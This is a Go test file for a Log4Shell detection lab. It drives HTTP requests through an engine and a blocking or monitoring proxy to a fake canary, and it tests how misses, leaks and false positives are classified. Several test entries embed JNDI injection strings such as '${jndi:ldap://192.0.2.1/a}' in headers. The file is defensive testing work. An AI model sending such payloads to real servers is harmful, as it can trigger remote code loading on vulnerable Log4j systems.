package lab

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/TurlaFSB/logshield/internal/corpus"
	"github.com/TurlaFSB/logshield/internal/engine"
	"github.com/TurlaFSB/logshield/internal/proxy"
)

// fakeCanary behaves like the real canary for this test: it reports a JNDI
// lookup whenever the request carries "${jndi:" or the token TRIGGER, which
// stands in for an evasion the engine does not know about.
func fakeCanary(t *testing.T) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var all strings.Builder
		all.WriteString(r.RequestURI)
		for k, vs := range r.Header {
			for _, v := range vs {
				all.WriteString(" " + k + "=" + v)
			}
		}
		all.Write(body)
		s := strings.ToLower(all.String())
		it := Item{Source: "all", Raw: "x", Rendered: "x"}
		if strings.Contains(s, "${jndi:") || strings.Contains(s, "trigger") {
			it.JNDI = []string{"ldap://192.0.2.1/a"}
			it.Changed = true
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(CanaryReply{Items: []Item{it}})
	}))
}

func entry(id, ds, expect, target string, hdrs ...[2]string) corpus.Entry {
	return corpus.Entry{ID: id, Dataset: ds, Class: "t",
		Request: corpus.Request{Method: "GET", Target: target, Headers: append([][2]string{{"Host", "app.example.com"}}, hdrs...)},
		Expect:  corpus.Expect{Decision: expect}}
}

func startProxy(t *testing.T, upstream string, mode proxy.Mode) string {
	t.Helper()
	u, err := url.Parse(upstream)
	if err != nil {
		t.Fatal(err)
	}
	p, err := proxy.New(proxy.Config{Upstream: u, Mode: mode, Logger: slog.New(slog.NewTextHandler(io.Discard, nil))})
	if err != nil {
		t.Fatal(err)
	}
	s := httptest.NewServer(p)
	t.Cleanup(s.Close)
	return strings.TrimPrefix(s.URL, "http://")
}

func TestBuildRaw(t *testing.T) {
	raw, err := BuildRaw(corpus.Request{Method: "POST", Target: "/a?b=%24", Headers: [][2]string{{"Host", "h"}, {"X", "${jndi:ldap://e/a}"}}, Body: "hello"})
	if err != nil {
		t.Fatal(err)
	}
	want := "POST /a?b=%24 HTTP/1.1\r\nHost: h\r\nX: ${jndi:ldap://e/a}\r\nContent-Length: 5\r\nConnection: close\r\n\r\nhello"
	if string(raw) != want {
		t.Fatalf("got %q\nwant %q", raw, want)
	}
	// Entry-supplied framing is left alone.
	raw, _ = BuildRaw(corpus.Request{Method: "POST", Target: "/", Headers: [][2]string{{"Host", "h"}, {"Transfer-Encoding", "chunked"}, {"Connection", "keep-alive"}}, Body: "0\r\n\r\n"})
	if strings.Contains(string(raw), "Content-Length") || strings.Contains(string(raw), "Connection: close") {
		t.Fatalf("added framing the entry controls: %q", raw)
	}
	if _, err := BuildRaw(corpus.Request{Body: "a", BodyB64: "YQ=="}); err == nil {
		t.Fatal("both body forms must be rejected")
	}
	raw, _ = BuildRaw(corpus.Request{BodyB64: "AAEC"})
	if !strings.HasSuffix(string(raw), "\r\n\r\n\x00\x01\x02") || !strings.Contains(string(raw), "Content-Length: 3") {
		t.Fatalf("binary body: %q", raw)
	}
	raw, _ = BuildRaw(corpus.Request{})
	if !strings.HasPrefix(string(raw), "GET / HTTP/1.1\r\nHost: lab.invalid") {
		t.Fatalf("defaults: %q", raw)
	}
}

func TestClassify(t *testing.T) {
	tests := []struct {
		name   string
		r      Result
		benign bool
		want   string
	}{
		{"caught", Result{Truth: TruthTriggered, Engine: "malicious", Expect: "malicious", Proxy: ProxyBlocked}, false, ""},
		{"miss", Result{Truth: TruthTriggered, Engine: "clean", Expect: "clean"}, false, "MISS"},
		{"miss on suspicious", Result{Truth: TruthTriggered, Engine: "suspicious", Expect: "suspicious"}, false, "MISS"},
		{"leak", Result{Truth: TruthTriggered, Engine: "malicious", Expect: "malicious", Proxy: ProxyPassed, ProxyTruth: TruthTriggered}, false, "LEAK"},
		{"passed but inert is not a leak", Result{Truth: TruthInert, Engine: "clean", Expect: "clean", Proxy: ProxyPassed, ProxyTruth: TruthInert}, true, ""},
		{"over-block of attack class is allowed", Result{Truth: TruthInert, Engine: "malicious", Expect: "malicious"}, false, ""},
		{"false positive", Result{Truth: TruthInert, Engine: "malicious", Expect: "clean"}, true, "FALSE_POSITIVE,EXPECT_MISMATCH"},
		{"false positive at proxy", Result{Truth: TruthInert, Engine: "clean", Expect: "clean", Proxy: ProxyBlocked}, true, "FALSE_POSITIVE"},
		{"expectation drift", Result{Truth: TruthInert, Engine: "suspicious", Expect: "malicious"}, false, "EXPECT_MISMATCH"},
		{"indeterminate attack", Result{Truth: TruthUnknown, Engine: "malicious", Expect: "malicious"}, false, "INDETERMINATE"},
		{"indeterminate benign is fine", Result{Truth: TruthUnknown, Engine: "clean", Expect: "clean"}, true, ""},
	}
	for _, tc := range tests {
		got := strings.Join(Classify(tc.r, tc.benign), ",")
		if got != tc.want {
			t.Errorf("%s: got %q want %q", tc.name, got, tc.want)
		}
	}
}

func TestRunAgainstFakes(t *testing.T) {
	can := fakeCanary(t)
	defer can.Close()
	canAddr := strings.TrimPrefix(can.URL, "http://")
	block := startProxy(t, can.URL, proxy.ModeBlock)
	monitor := startProxy(t, can.URL, proxy.ModeMonitor)

	entries := []corpus.Entry{
		entry("attack", "bypass", "malicious", "/", [2]string{"User-Agent", "${jndi:ldap://192.0.2.1/a}"}),
		entry("evasion-unknown-to-engine", "bypass", "clean", "/?x=TRIGGER"),
		entry("benign", "benign", "clean", "/?q=hello"),
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	res, err := Run(ctx, entries, Options{CanaryAddr: canAddr, ProxyAddr: block, ReadyProbe: true, Engine: engine.Config{}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	by := map[string]Result{}
	for _, r := range res {
		by[r.ID] = r
	}
	if r := by["attack"]; r.Truth != TruthTriggered || r.Engine != "malicious" || r.Proxy != ProxyBlocked || len(r.Problems) != 0 {
		t.Errorf("attack: %+v", r)
	}
	if r := by["evasion-unknown-to-engine"]; strings.Join(r.Problems, ",") != "MISS,LEAK" {
		t.Errorf("evasion should be MISS+LEAK, got %+v", r)
	}
	if r := by["benign"]; r.Truth != TruthInert || len(r.Problems) != 0 || r.Proxy != ProxyPassed {
		t.Errorf("benign: %+v", r)
	}
	s := Summarize(res)
	if !s.Failed() || s.Triggered != 2 || s.Caught != 1 || s.ByProblem[ProblemMiss] != 1 || s.ByProblem[ProblemLeak] != 1 {
		t.Errorf("summary: %+v", s)
	}
	md := Markdown(res, s, map[string]string{"Label": "test"})
	if !strings.Contains(md, "**FAIL**") || !strings.Contains(md, "evasion-unknown-to-engine") {
		t.Errorf("report:\n%s", md)
	}
	if strings.Contains(md, "${jndi") {
		t.Error("report must not contain live lookups")
	}

	// A monitor-mode proxy forwards the attack, which must be reported as a leak.
	res, err = Run(ctx, entries[:1], Options{CanaryAddr: canAddr, ProxyAddr: monitor}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(res[0].Problems, ","); got != "LEAK" {
		t.Errorf("monitor-mode proxy: want LEAK, got %q (%+v)", got, res[0])
	}

	// Without a proxy phase the same entries only compare engine and Log4j.
	res, _ = Run(ctx, entries[2:], Options{CanaryAddr: canAddr}, nil)
	if res[0].Proxy != ProxySkipped || Summarize(res).Failed() {
		t.Errorf("no proxy phase: %+v", res[0])
	}
}

func TestRunErrors(t *testing.T) {
	if _, err := Run(context.Background(), nil, Options{}, nil); err == nil {
		t.Error("missing canary address must fail")
	}
	// Something that is not a canary must stop the run before any payload is sent.
	other := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write([]byte("hi")) }))
	defer other.Close()
	_, err := Run(context.Background(), nil, Options{CanaryAddr: strings.TrimPrefix(other.URL, "http://"), ReadyProbe: true}, nil)
	if err == nil {
		t.Error("probe must reject a non-canary")
	}
	// Unreachable canary yields indeterminate results, never a pass for attacks.
	res, _ := Run(context.Background(), []corpus.Entry{entry("a", "bypass", "malicious", "/", [2]string{"X", "${jndi:ldap://e/a}"})},
		Options{CanaryAddr: "127.0.0.1:1", Timeout: time.Second}, nil)
	if res[0].Truth != TruthUnknown || !strings.Contains(strings.Join(res[0].Problems, ","), "INDETERMINATE") {
		t.Errorf("unreachable canary: %+v", res[0])
	}
}

func TestTruthOfCanaryError(t *testing.T) {
	r := Response{Status: 200, Canary: &CanaryReply{Items: []Item{
		{Source: "a", Raw: "x", Rendered: "x"},
		{Source: "b", Raw: "${jndi:ldap://e/a}", Rendered: "", Error: "empty-capture"},
	}}}
	if got, _ := TruthOf(r, nil); got != TruthUnknown {
		t.Fatalf("a canary that could not observe Log4j must give no ground truth, got %s", got)
	}
	// An error must win over a lookup seen elsewhere in the same reply.
	r.Canary.Items[0].JNDI = []string{"ldap://e/b"}
	if got, _ := TruthOf(r, nil); got != TruthUnknown {
		t.Fatalf("got %s", got)
	}
}
